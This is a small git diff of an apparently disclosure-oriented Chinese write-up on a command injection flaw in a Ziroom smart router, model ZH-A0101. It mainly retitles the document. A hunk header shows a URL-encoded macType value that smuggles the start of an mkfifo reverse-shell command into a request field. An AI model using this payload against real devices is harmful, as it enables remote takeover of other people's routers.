@@ -1,4 +1,4 @@
-## 自如路由器漏洞
+## 自如智能-路由器命令注入漏洞
 
 型号：ZH-A0101
 
@@ -58,4 +58,5 @@ macType=1%22%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin
 
 
 ![img](../main/images/2026-01-18-16-51-14-image.png?msec=1768730054228)
+
 
